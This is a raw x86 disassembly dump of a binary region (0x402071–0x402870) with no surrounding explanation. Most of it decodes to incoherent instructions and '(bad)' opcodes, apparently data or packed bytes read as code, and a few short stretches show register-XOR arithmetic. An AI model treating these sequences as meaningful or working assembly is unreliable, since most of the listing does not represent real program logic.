  402071:	or     ch,ah
  402073:	arpl   WORD PTR [edi+0x55c141eb],sp
  402079:	xor    ebp,DWORD PTR [edi]
  40207b:	ins    BYTE PTR es:[edi],dx
  40207c:	pop    ebp
  40207d:	push   edx
  40207e:	add    edi,esi
  402080:	dec    esp
  402081:	xchg   edx,eax
  402082:	or     bl,bh
  402084:	enter  0x58d9,0x80
  402088:	hlt    
  402089:	adc    ch,dh
  40208b:	and    al,0xcd
  40208d:	cdq    
  40208e:	mov    ds:0x2039dc05,al
  402093:	popa   
  402094:	ret    0x317d
  402097:	cmp    esi,DWORD PTR [eax-0x527e582d]
  40209d:	sbb    bl,cl
  40209f:	dec    edi
  4020a0:	in     al,dx
  4020a1:	cld    
  4020a2:	mov    ds:0xd782ebaf,eax
  4020a7:	nop
  4020a8:	dec    ecx
  4020a9:	mov    cl,ch
  4020ab:	adc    DWORD PTR [esi+0x34],eax
  4020ae:	imul   eax,edi,0xcab51afe
  4020b4:	pusha  
  4020b5:	dec    ebx
  4020b6:	std    
  4020b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b8:	xchg   ebp,eax
  4020b9:	adc    DWORD PTR [ebp+ecx*4-0x46],eax
  4020bd:	adc    ch,BYTE PTR [ecx]
  4020bf:	sub    ebx,DWORD PTR [edi]
  4020c1:	retf   0x3c08
  4020c4:	jecxz  0x402076
  4020c6:	jle    0x4020ac
  4020c8:	mov    esi,0x9e06b3f3
  4020cd:	cwde   
  4020ce:	mov    eax,ds:0xd95772ea
  4020d3:	(bad)  
  4020d4:	mov    bh,0x62
  4020d6:	iret   
  4020d7:	cli    
  4020d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020d9:	loope  0x4020bf
  4020db:	and    al,0x78
  4020dd:	(bad)  
  4020de:	sub    ch,dh
  4020e0:	call   0xad6c8589
  4020e5:	std    
  4020e6:	ret    0x8ec0
  4020e9:	adc    eax,0xd85f69ae
  4020ee:	(bad)  
  4020ef:	pop    eax
  4020f0:	nop
  4020f1:	or     ebx,eax
  4020f3:	pop    edx
  4020f4:	push   0x14721c82
  4020f9:	sbb    BYTE PTR [edi-0x4aef3716],dh
  4020ff:	inc    esp
  402100:	loopne 0x402170
  402102:	popf   
  402103:	sbb    edx,edi
  402105:	fiadd  DWORD PTR [ebp+esi*4-0x4b]
  402109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40210a:	sahf   
  40210b:	out    dx,eax
  40210c:	leave  
  40210d:	mov    DWORD PTR [esi-0x61],edx
  402110:	add    edx,DWORD PTR [ecx-0x75]
  402113:	arpl   dx,bp
  402115:	mov    ch,0xcc
  402117:	loop   0x40215f
  402119:	jbe    0x4020c3
  40211b:	adc    dl,BYTE PTR [edi+0x9]
  40211e:	in     eax,0xfa
  402120:	outs   dx,DWORD PTR ds:[esi]
  402121:	sub    ecx,DWORD PTR cs:[edi+0x1f]
  402125:	add    DWORD PTR [ecx+esi*4],esp
  402128:	sbb    edi,DWORD PTR [eax-0x8]
  40212b:	adc    ah,BYTE PTR [edx+0x6dd7df09]
  402131:	loope  0x402128
  402133:	or     eax,0xd5c255b2
  402138:	add    al,0x6b
  40213a:	(bad)  
  40213b:	scas   eax,DWORD PTR es:[edi]
  40213c:	loop   0x40213f
  40213e:	iret   
  40213f:	mov    DWORD PTR [eax+esi*1+0x75],ebx
  402143:	mov    ds:0x83e97afd,al
  402148:	adc    al,0x8d
  40214a:	jmp    0x4021af
  40214c:	and    eax,0xd6090a9
  402151:	cmp    al,0xc0
  402153:	mov    ah,0xf0
  402155:	aas    
  402156:	or     ah,al
  402158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402159:	je     0x4021b1
  40215b:	scas   eax,DWORD PTR es:[edi]
  40215c:	lahf   
  40215d:	daa    
  40215e:	je     0x4021c3
  402160:	add    BYTE PTR [ebp+0x7d],bh
  402163:	sahf   
  402164:	gs iret 
  402166:	shl    DWORD PTR [edi-0x6071fb5a],0x48
  40216d:	ror    DWORD PTR [ecx-0x63fb1bed],0x94
  402174:	fwait
  402175:	repnz mov al,0xfb
  402178:	mul    BYTE PTR [edx+0x27]
  40217b:	pop    esp
  40217c:	retf   0x6b64
  40217f:	xor    BYTE PTR [edx+0x2c],ch
  402182:	lahf   
  402183:	sbb    DWORD PTR [eax+0x55],ecx
  402186:	lock dec ebp
  402188:	rol    BYTE PTR [ebp+0x56aca93e],1
  40218e:	sbb    DWORD PTR [esi-0x58bdf909],ecx
  402194:	call   0x26bb2966
  402199:	fdiv   st,st(1)
  40219b:	mov    ah,0x5
  40219d:	push   ds
  40219e:	xchg   DWORD PTR [eax+eiz*4-0x21],ebp
  4021a2:	js     0x4021dc
  4021a4:	push   ebp
  4021a5:	add    al,0x46
  4021a7:	xor    bl,BYTE PTR [ebx+ebp*2-0x26]
  4021ab:	xchg   ebx,eax
  4021ac:	aaa    
  4021ad:	push   0xffffff8d
  4021af:	aam    0x34
  4021b1:	push   0xa39f0a58
  4021b6:	or     al,0x27
  4021b8:	in     al,0xd9
  4021ba:	mov    eax,ds:0x1a68ff2e
  4021bf:	cld    
  4021c0:	and    al,0x28
  4021c2:	enter  0x8221,0x49
  4021c6:	pushf  
  4021c7:	repnz dec ebx
  4021c9:	cmp    eax,0xff61016d
  4021ce:	xchg   esi,eax
  4021cf:	xor    ecx,DWORD PTR [ebp-0x31]
  4021d2:	adc    al,0xbf
  4021d4:	mov    eax,ds:0x875f75cc
  4021d9:	add    esp,DWORD PTR [eax+0x1cfb22f8]
  4021df:	add    BYTE PTR [bx+si-0x1],0xf8
  4021e4:	leave  
  4021e5:	scas   eax,DWORD PTR es:[edi]
  4021e6:	(bad)  
  4021e7:	out    0x88,al
  4021e9:	gs stos BYTE PTR es:[edi],al
  4021eb:	dec    ebp
  4021ec:	stc    
  4021ed:	mov    al,ds:0x205708eb
  4021f2:	aas    
  4021f3:	mov    ds:0x31af0ee,al
  4021f8:	inc    ebx
  4021f9:	sub    edx,DWORD PTR [eax+0x2802bd54]
  4021ff:	enter  0x495d,0xdd
  402203:	and    esi,0x77
  402206:	fldcw  WORD PTR [ecx+0x57]
  402209:	into   
  40220a:	ror    BYTE PTR [ebx+0x5],cl
  40220d:	(bad)  
  40220e:	xchg   ecx,eax
  40220f:	or     eax,DWORD PTR [edx+0x2761ac04]
  402215:	mov    ebx,0x90734b05
  40221a:	loopne 0x4021b0
  40221c:	xchg   ebp,eax
  40221d:	cmp    cl,bh
  40221f:	sbb    ah,bh
  402221:	or     ah,bl
  402223:	(bad)  
  402224:	sbb    edi,esp
  402226:	xor    DWORD PTR [esi+ecx*4+0x26fdf53e],0x6b5dd6f1
  402231:	adc    BYTE PTR [esi-0x1c],ah
  402234:	or     BYTE PTR [edx+0x33],ch
  402237:	pop    esi
  402238:	out    dx,eax
  402239:	dec    DWORD PTR ds:0x2d8464
  40223f:	inc    edx
  402240:	push   ecx
  402241:	outs   dx,DWORD PTR ds:[esi]
  402242:	dec    ecx
  402243:	mov    dh,0x28
  402245:	add    al,0x79
  402247:	ja     0x40229e
  402249:	mov    ds:0x3233c6ee,eax
  40224e:	fstp   st(3)
  402250:	fidivr WORD PTR [eax]
  402252:	and    ah,dl
  402254:	dec    edx
  402255:	cmp    BYTE PTR [esi-0x69853090],dh
  40225b:	mov    BYTE PTR [ebp+0x60],al
  40225e:	push   ebp
  40225f:	adc    BYTE PTR [edi-0x8],bh
  402262:	aam    0x49
  402264:	pushf  
  402265:	jle    0x402299
  402267:	xchg   esp,eax
  402268:	(bad)  
  402269:	mov    ebx,0x123076d3
  40226e:	mov    DWORD PTR [ecx+0x48],eax
  402271:	add    ecx,DWORD PTR [ebp+0x77]
  402274:	(bad)  
  402275:	xchg   esp,eax
  402276:	pop    ebx
  402277:	mov    dl,0xbc
  402279:	mov    ds:0x27cc6b19,eax
  40227e:	sub    ch,al
  402280:	sub    edi,DWORD PTR [ebx]
  402282:	cdq    
  402283:	pop    edx
  402284:	pop    edi
  402285:	dec    esp
  402286:	adc    eax,0xa17018b5
  40228b:	cmc    
  40228c:	test   eax,0x42b1769f
  402291:	in     al,0x3c
  402293:	adc    BYTE PTR [edi-0x43],bh
  402296:	dec    ebx
  402297:	in     al,dx
  402298:	or     DWORD PTR [esi],0x8ef23e35
  40229e:	montmul (bad)
  40229f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a0:	ret    0xf419
  4022a3:	adc    esp,DWORD PTR [ebx+esi*1-0x3a]
  4022a7:	and    DWORD PTR ds:0x42a771,0x42a7b5
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xb1682c5b
  4022e1:	mov    esi,0x90406f3
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x402272
  4022ed:	jecxz  0x402356
  4022ef:	xchg   DWORD PTR [eax-0x1f],ebp
  4022f2:	and    BYTE PTR [edi],bh
  4022f4:	fnstenv [ebx+0x185eb63c]
  4022fa:	mov    bl,0xf1
  4022fc:	mov    al,ds:0xf4c157a0
  402301:	and    bl,dl
  402303:	imul   ebp,DWORD PTR [eax-0x29],0x2f
  402307:	call   0xfcd1d7d8
  40230c:	retf   0xbf09
  40230f:	xchg   DWORD PTR [ebx-0xd63df44],ecx
  402315:	sub    ebp,0x48
  402318:	mov    bl,0xd
  40231a:	scas   eax,DWORD PTR es:[edi]
  40231b:	cmp    eax,0x817dc487
  402320:	xor    eax,0x10a1473a
  402325:	gs hlt 
  402327:	push   es
  402328:	nop
  402329:	sbb    BYTE PTR [edx+ebp*2+0x33a262a0],cl
  402330:	xlat   BYTE PTR ds:[ebx]
  402331:	push   ss
  402332:	imul   ebp,DWORD PTR [edx-0xd42f3c9],0x3e
  402339:	ins    DWORD PTR es:[edi],dx
  40233a:	stc    
  40233b:	sbb    DWORD PTR [ebx],ecx
  40233d:	(bad)  
  40233e:	xor    BYTE PTR [ecx],ch
  402340:	stos   BYTE PTR es:[edi],al
  402341:	ret    0x23d2
  402344:	xor    edi,edx
  402346:	int3   
  402347:	xchg   ecx,eax
  402348:	shl    BYTE PTR ds:0xa137cdbe,0xf5
  40234f:	add    DWORD PTR [ebx+0x2e],esp
  402352:	ret    0x3dbe
  402355:	add    al,0x22
  402357:	pop    edi
  402358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402359:	and    BYTE PTR [edx+0x77],0x58
  40235d:	xor    edi,esp
  40235f:	inc    ecx
  402360:	dec    esi
  402361:	daa    
  402362:	repz push 0xb14be4c9
  402368:	repz jo 0x40233a
  40236b:	adc    cl,cl
  40236d:	call   0xf7a3b68f
  402372:	mov    al,0x27
  402374:	fbstp  TBYTE PTR [edx]
  402376:	test   al,0x5e
  402378:	retf   0xb9b8
  40237b:	adc    BYTE PTR [ebx+ebx*4+0x4ae7bdef],cl
  402382:	(bad)  
  402384:	inc    edx
  402385:	mov    ebp,0xae2db59
  40238a:	fs aas 
  40238c:	mov    esp,ebx
  40238e:	sbb    al,0x38
  402390:	mov    dl,0x6e
  402392:	test   BYTE PTR [ecx+0xd],cl
  402395:	les    esi,FWORD PTR [ebx+eiz*2]
  402398:	pop    ss
  402399:	push   es
  40239a:	sti    
  40239b:	sub    BYTE PTR [edi],0xc1
  40239e:	clc    
  40239f:	jbe    0x40233b
  4023a1:	cli    
  4023a2:	(bad)  
  4023a3:	mov    dl,0x29
  4023a5:	(bad)  
  4023a6:	out    0x68,eax
  4023a8:	sbb    eax,0x5a8da7fe
  4023ad:	xchg   esp,eax
  4023ae:	retf   0x4300
  4023b1:	xchg   ecx,eax
  4023b2:	cmp    DWORD PTR [edx-0x12],edx
  4023b5:	adc    BYTE PTR fs:[ecx-0x2e9a556d],ch
  4023bc:	add    al,0xa4
  4023be:	xor    bl,BYTE PTR [edi]
  4023c0:	scas   eax,DWORD PTR es:[edi]
  4023c1:	sbb    BYTE PTR [eax],dl
  4023c3:	jle    0x402432
  4023c5:	and    bl,BYTE PTR [ecx-0x54]
  4023c8:	lods   al,BYTE PTR ds:[esi]
  4023c9:	icebp  
  4023ca:	bound  eax,QWORD PTR [edx]
  4023cc:	retf   
  4023cd:	test   al,0x75
  4023cf:	xlat   BYTE PTR ds:[ebx]
  4023d0:	mov    esi,0x2d09e17a
  4023d5:	out    0x48,eax
  4023d7:	(bad)  
  4023d8:	adc    DWORD PTR [eax],edi
  4023da:	jmp    0x4023bd
  4023dc:	stos   DWORD PTR es:[edi],eax
  4023dd:	inc    eax
  4023de:	ror    DWORD PTR [edi-0x4ba6b830],1
  4023e4:	test   al,0x39
  4023e6:	test   al,0x6f
  4023e8:	jnp    0x4023af
  4023ea:	test   al,bl
  4023ec:	cmc    
  4023ed:	cmp    al,BYTE PTR [esi+ebx*4-0x191b02ef]
  4023f4:	inc    esi
  4023f5:	(bad)  
  4023f6:	fimul  DWORD PTR [ebx]
  4023f8:	sbb    DWORD PTR [eax+ecx*8-0x45280bc6],eax
  4023ff:	aam    0xb9
  402401:	shr    BYTE PTR [ebx-0x7a7638a6],0x9b
  402408:	jle    0x4023f6
  40240a:	(bad)  
  40240b:	jne    0x402442
  40240d:	or     DWORD PTR [edi-0x18b3db90],ebx
  402413:	jp     0x4023be
  402415:	mov    esp,0x3985d8c4
  40241a:	cs in  eax,dx
  40241c:	ficom  DWORD PTR [esi]
  40241e:	jbe    0x402483
  402420:	cmp    DWORD PTR [edx+0x50d94a82],esi
  402426:	in     al,0xc8
  402428:	call   ecx
  40242a:	mov    esp,ecx
  40242c:	inc    edx
  40242d:	push   ds
  40242e:	mov    esi,0x44624337
  402433:	or     al,0x9
  402435:	daa    
  402436:	push   0xa921ec3b
  40243b:	rcr    BYTE PTR [ecx+0x3c447af1],cl
  402441:	(bad)  
  402442:	retf   0xa003
  402445:	pop    ebx
  402446:	mov    ecx,0xcdfd1356
  40244b:	mov    bh,0x6
  40244d:	jns    0x4023d2
  40244f:	shl    BYTE PTR fs:[ebx],cl
  402452:	xchg   ecx,eax
  402453:	cld    
  402454:	jge    0x402422
  402456:	out    dx,al
  402457:	jnp    0x4024bc
  402459:	add    BYTE PTR [ebx+ebx*2+0x52],dl
  40245d:	sbb    al,0xca
  40245f:	fild   WORD PTR [ebx-0x8c9e6a6]
  402465:	test   DWORD PTR [edi+0x10],ebx
  402468:	repz or eax,0x4c3cf06e
  40246e:	mov    esi,0xc1af524c
  402473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402474:	outs   dx,DWORD PTR ds:[esi]
  402475:	sbb    DWORD PTR [ebp+0x33692835],ebx
  40247b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40247c:	test   BYTE PTR [eax],dh
  40247e:	mov    eax,DWORD PTR [eax-0x3a]
  402481:	lods   al,BYTE PTR ds:[esi]
  402482:	add    ch,BYTE PTR [ebx-0x55]
  402485:	adc    al,0xe
  402487:	xor    al,0x78
  402489:	ins    BYTE PTR es:[edi],dx
  40248a:	aaa    
  40248b:	cmc    
  40248c:	pop    esp
  40248d:	cwde   
  40248e:	jno    0x402496
  402490:	jecxz  0x402445
  402492:	mov    cl,0x7d
  402494:	aam    0x13
  402496:	push   0xffffffdc
  402498:	lock int3 
  40249a:	repz test BYTE PTR [esi-0x16cddf1b],ah
  4024a1:	jmp    0x185a:0x17469565
  4024a8:	repz ja 0x40248b
  4024ab:	aam    0x42
  4024ad:	loope  0x40249f
  4024af:	icebp  
  4024b0:	xchg   edx,esi
  4024b2:	inc    ecx
  4024b3:	dec    esi
  4024b4:	xchg   esp,eax
  4024b5:	call   0x1586cf40
  4024ba:	pop    esp
  4024bb:	outs   dx,BYTE PTR es:[esi]
  4024bd:	frstor [ebx]
  4024bf:	fwait
  4024c0:	sub    eax,0x46b6d6e5
  4024c5:	push   ebx
  4024c6:	(bad)  
  4024c7:	sar    DWORD PTR [esi],1
  4024c9:	sub    al,0x34
  4024cb:	sbb    BYTE PTR [edx],bl
  4024cd:	mov    al,0x30
  4024cf:	pusha  
  4024d0:	mov    eax,0x7d93a03c
  4024d5:	outs   dx,BYTE PTR ds:[esi]
  4024d6:	sub    ah,bh
  4024d8:	or     BYTE PTR ds:0x21237952,bh
  4024de:	hlt    
  4024df:	in     al,dx
  4024e0:	jmp    0xb2b2eda4
  4024e5:	fidiv  DWORD PTR [edi+0x617ec07c]
  4024eb:	jg     0x4024ea
  4024ed:	int3   
  4024ee:	pop    esp
  4024ef:	add    eax,0x399681a5
  4024f4:	xchg   DWORD PTR [ebx],esi
  4024f6:	jecxz  0x40252f
  4024f8:	(bad)  
  4024f9:	fucomp st(1)
  4024fb:	xor    BYTE PTR [edi+0x6849bcd4],bl
  402501:	pop    ds
  402502:	je     0x402488
  402504:	dec    edx
  402505:	push   0xffffffe3
  402507:	inc    esi
  402508:	fnstenv [edx-0x14566db]
  40250e:	xlat   BYTE PTR ds:[ebx]
  40250f:	or     al,0xcd
  402511:	in     al,0x4a
  402513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402514:	add    esp,DWORD PTR [ecx-0x4a]
  402517:	xchg   ebx,eax
  402518:	sti    
  402519:	rol    BYTE PTR [ecx],0xb8
  40251c:	xchg   ebp,eax
  40251d:	lea    ecx,[edi+0x74]
  402520:	leave  
  402521:	out    dx,eax
  402522:	imul   edi,ebx,0x354902cb
  402528:	icebp  
  402529:	(bad)
  40252c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252d:	int3   
  40252e:	ret    0xe2d4
  402531:	push   0xd2318d57
  402536:	jp     0x402526
  402538:	mov    edx,0xf571606b
  40253d:	add    ecx,DWORD PTR [edi+0x12d04550]
  402543:	(bad)  
  402544:	xchg   ecx,eax
  402545:	add    edx,DWORD PTR [edi+edx*2]
  402548:	in     eax,dx
  402549:	pop    ecx
  40254a:	xlat   BYTE PTR ds:[ebx]
  40254b:	pop    ebp
  40254c:	mov    bl,0xd1
  40254e:	and    al,dh
  402550:	fwait
  402551:	sub    DWORD PTR [edi+0xd],0x6d471887
  402558:	hlt    
  402559:	jo     0x402572
  40255b:	inc    BYTE PTR [edi-0x60]
  40255e:	push   0xffffffd3
  402560:	dec    eax
  402561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402562:	repnz sbb DWORD PTR [ecx],edx
  402565:	outs   dx,DWORD PTR ds:[esi]
  402566:	sahf   
  402567:	test   DWORD PTR [edx],esp
  402569:	std    
  40256a:	out    dx,eax
  40256b:	test   al,0x79
  40256d:	sar    BYTE PTR [ecx],cl
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	retf   0xdec7
  402596:	pop    ecx
  402597:	mov    cl,BYTE PTR [edi]
  402599:	js     0x402613
  40259b:	(bad)  
  40259c:	jle    0x402616
  40259e:	js     0x402597
  4025a0:	js     0x40255c
  4025a2:	hlt    
  4025a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a4:	sub    al,0x3c
  4025a6:	loope  0x4025f7
  4025a8:	cli    
  4025a9:	mov    ds:0x3a624c5c,al
  4025ae:	test   eax,0x2db9ec11
  4025b3:	pushf  
  4025b4:	shr    BYTE PTR [ecx+ebx*2-0x43],1
  4025b8:	cs in  eax,dx
  4025ba:	ret    
  4025bb:	adc    al,0x81
  4025bd:	aas    
  4025be:	pop    es
  4025bf:	das    
  4025c0:	jmp    0x5470f0cc
  4025c5:	jae    0x4025a0
  4025c7:	outs   dx,BYTE PTR ds:[esi]
  4025c8:	aad    0x60
  4025ca:	ret    
  4025cb:	dec    esi
  4025cc:	jge    0x40264a
  4025ce:	mov    ecx,0x3dc9005a
  4025d3:	sar    ch,1
  4025d5:	aad    0x6e
  4025d7:	adc    eax,0x78233d3d
  4025dc:	pop    ecx
  4025dd:	sbb    edi,DWORD PTR [ecx+ecx*8-0x70]
  4025e1:	push   0x5d
  4025e3:	lea    ebx,[eax]
  4025e5:	jno    0x4025a4
  4025e7:	cld    
  4025e8:	enter  0x4a7d,0x9d
  4025ec:	cdq    
  4025ed:	fmul   QWORD PTR gs:[ebx-0x69]
  4025f1:	mov    dh,0x56
  4025f3:	fdivr  st,st(2)
  4025f5:	test   DWORD PTR [edi],0x8bb727a
  4025fb:	xchg   esi,eax
  4025fc:	(bad)  
  4025fd:	xor    eax,0x639ad11d
  402602:	loopne 0x4025ab
  402604:	or     BYTE PTR [ecx+0x4a2bae3b],bh
  40260a:	rcr    BYTE PTR [edi-0x6f923796],1
  402610:	xchg   edx,eax
  402611:	cwde   
  402612:	xchg   esi,eax
  402613:	pop    ebx
  402614:	add    eax,0x84ce60e1
  402619:	fdiv   QWORD PTR [ecx+0x3]
  40261c:	sub    eax,0x99ba525a
  402621:	pop    eax
  402622:	mov    edi,0x11a95181
  402627:	(bad)  
  402628:	sbb    al,BYTE PTR [eax]
  40262a:	ja     0x4026aa
  40262c:	jg     0x402660
  40262e:	mov    ebp,0x1471c2b6
  402633:	jp     0x4025e4
  402635:	fucomip st,st(7)
  402637:	inc    ebx
  402638:	jb     0x4025e2
  40263a:	dec    esi
  40263b:	retf   0x21d8
  40263e:	ins    DWORD PTR es:[edi],dx
  40263f:	int3   
  402640:	fdivr  QWORD PTR [edx]
  402642:	paddd  mm3,QWORD PTR [esi-0x477f25a5]
  402649:	ret    0xbe8b
  40264c:	cdq    
  40264d:	mul    DWORD PTR [ebp-0x39]
  402650:	jo     0x402690
  402652:	adc    edx,DWORD PTR [eax]
  402654:	cld    
  402655:	push   0xf885a924
  40265a:	or     al,0xe4
  40265c:	sbb    ah,BYTE PTR [ecx+0x6c]
  40265f:	mov    ebx,0xf7d4214f
  402664:	mov    ebp,0xad54b157
  402669:	pop    edx
  40266a:	and    eax,0xed93edea
  40266f:	ret    
  402670:	imul   ebx,DWORD PTR [ebp-0x4f],0xffffffd6
  402674:	adc    cl,BYTE PTR [esp+eiz*8+0x2c]
  402678:	idiv   DWORD PTR [edx-0x21c60a62]
  40267e:	adc    eax,DWORD PTR [ecx-0x494ffe23]
  402684:	(bad)  
  402685:	xchg   ebx,eax
  402686:	into   
  402687:	(bad)  
  402688:	das    
  402689:	inc    edx
  40268a:	dec    ecx
  40268b:	mov    WORD PTR [edx],ss
  40268d:	pushf  
  40268e:	dec    ebp
  40268f:	add    edi,esi
  402691:	stos   BYTE PTR es:[edi],al
  402692:	iret   
  402693:	imul   ebx,DWORD PTR [esp+ebp*1],0xd5d6d4c8
  40269a:	out    dx,eax
  40269b:	fnstenv [ebx]
  40269d:	aaa    
  40269e:	add    al,0x94
  4026a0:	mov    edx,eax
  4026a2:	push   ebx
  4026a3:	push   cs
  4026a4:	test   al,0x4
  4026a6:	jecxz  0x402691
  4026a8:	inc    esi
  4026a9:	addr16 popa 
  4026ab:	(bad)  
  4026ac:	stc    
  4026ad:	mov    ecx,ebp
  4026af:	add    ecx,DWORD PTR [ebx+esi*2-0x4b]
  4026b3:	mov    dl,0xce
  4026b5:	xor    DWORD PTR [ebx],eax
  4026b7:	inc    eax
  4026b8:	pop    ebx
  4026b9:	xchg   edx,eax
  4026ba:	(bad)  
  4026bc:	std    
  4026bd:	mov    ds:0x795fb30,eax
  4026c2:	fidiv  WORD PTR [ebx+0x160b06e5]
  4026c9:	inc    ecx
  4026ca:	inc    esp
  4026cb:	retf   0xc1d6
  4026ce:	fdiv   QWORD PTR [esi-0x1628400d]
  4026d4:	ss lahf 
  4026d6:	enter  0xf5f9,0xb9
  4026da:	lahf   
  4026db:	inc    ebp
  4026dc:	out    0xf6,al
  4026de:	es stos DWORD PTR es:[edi],eax
  4026e0:	mov    ecx,0xd44474e8
  4026e5:	and    BYTE PTR [edi+edi*2-0x251a449e],ch
  4026ec:	push   ecx
  4026ed:	dec    DWORD PTR [edx+0x786659db]
  4026f3:	or     BYTE PTR [eax-0x74],ah
  4026f6:	(bad)  
  4026f7:	jne    0x402701
  4026f9:	daa    
  4026fa:	lock in eax,0x39
  4026fd:	jge    0x402689
  4026ff:	jb     0x4026ac
  402701:	sub    bl,BYTE PTR [eax+edi*1-0x80]
  402705:	jnp    0x4026a4
  402707:	push   cs
  402708:	cs loop 0x40269c
  40270b:	fsub   DWORD PTR [edx-0x649fa9db]
  402711:	push   es
  402712:	pop    esi
  402713:	orps   xmm7,XMMWORD PTR [ebp-0x85c961b]
  40271a:	pop    eax
  40271b:	imul   eax,DWORD PTR [ecx+0x31],0x6e
  40271f:	bound  ebx,QWORD PTR [eax]
  402721:	in     eax,0x4f
  402723:	xchg   ebx,eax
  402724:	sahf   
  402725:	and    bh,BYTE PTR [edx+0x47d7a40d]
  40272b:	adc    esp,ebx
  40272d:	xchg   ecx,eax
  40272e:	inc    esp
  40272f:	frstor [esi+ebp*1+0x1db0d875]
  402736:	mov    esi,0x9e00bf77
  40273b:	and    al,cl
  40273d:	jmp    DWORD PTR [esi+0x3f]
  402740:	fwait
  402741:	adc    cl,BYTE PTR [edi+0x4279f93b]
  402747:	fld    DWORD PTR [edi-0x6d67d6dc]
  40274d:	dec    edx
  40274e:	fmul   QWORD PTR [ecx-0x6228100e]
  402754:	and    di,WORD PTR [ecx+0x43]
  402758:	in     al,dx
  402759:	test   BYTE PTR [edi+0x62],cl
  40275c:	ss cmp edx,eax
  40275f:	jne    0x402794
  402761:	ds mov eax,gs:0x6d46667e
  402768:	leave  
  402769:	inc    eax
  40276a:	push   0xd68ede44
  40276f:	xor    DWORD PTR [edx],esi
  402771:	jg     0x402767
  402773:	jge    0x4026f9
  402775:	test   al,0xbb
  402777:	neg    DWORD PTR [ecx]
  402779:	sti    
  40277a:	lock ds mov ebx,0x9dd8531a
  402781:	cmp    DWORD PTR [ebx+0x26],edi
  402784:	aaa    
  402785:	call   FWORD PTR [eax-0x10]
  402788:	and    WORD PTR [ecx],ax
  40278b:	adc    DWORD PTR [ebp+0x67],ebx
  40278e:	fsub   QWORD PTR [ecx+0x4c7fbfe]
  402794:	or     edi,eax
  402796:	mov    ebp,0xd9ba82fb
  40279b:	inc    ecx
  40279c:	hlt    
  40279d:	cmp    dl,BYTE PTR ds:0x9ec886eb
  4027a3:	int3   
  4027a4:	ror    DWORD PTR [ebp-0x13df752e],0xe1
  4027ab:	dec    edx
  4027ac:	push   0xffffffe3
  4027ae:	sub    eax,0x8267280d
  4027b3:	ja     0x402810
  4027b5:	hlt    
  4027b6:	inc    edx
  4027b7:	pop    ax
  4027b9:	pop    edx
  4027ba:	and    esp,DWORD PTR [edx+edi*8+0x2239089e]
  4027c1:	adc    al,0x31
  4027c3:	mov    ebx,0x8f33a5b5
  4027c8:	call   0xf913:0xd1c43ce4
  4027cf:	jl     0x40282b
  4027d1:	shr    BYTE PTR [edi+ebp*2+0x3a6b9129],cl
  4027d8:	jno    0x402788
  4027da:	jp     0x402843
  4027dc:	(bad)  
  4027de:	(bad)  
  4027df:	jmp    0xf0dd1922
  4027e4:	in     eax,dx
  4027e5:	or     DWORD PTR [esi-0x3e],0x17
  4027e9:	mov    WORD PTR [edi+0x6c21f400],es
  4027ef:	or     cl,BYTE PTR [ecx]
  4027f1:	push   edx
  4027f2:	and    eax,0x4ea3a3d8
  4027f7:	pop    ds
  4027f8:	dec    ebp
  4027f9:	(bad)  
  4027fa:	xor    ch,BYTE PTR [esi+0x43]
  4027fd:	mov    DWORD PTR [ecx+eiz*4-0x70],edi
  402801:	out    0x88,al
  402803:	xchg   esp,eax
  402804:	int    0xbf
  402806:	repz xchg ecx,eax
  402808:	loopne 0x4027c4
  40280a:	js     0x402799
  40280c:	mov    al,0x54
  40280e:	dec    ebx
  40280f:	into   
  402810:	sbb    esi,edx
  402812:	dec    edi
  402813:	mov    edi,0x15af494f
  402818:	out    dx,al
  402819:	jmp    0x40289a
  40281b:	shl    DWORD PTR [ebx-0xa],0xca
  40281f:	fadd   QWORD PTR [eax-0x740fba75]
  402825:	dec    ebp
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
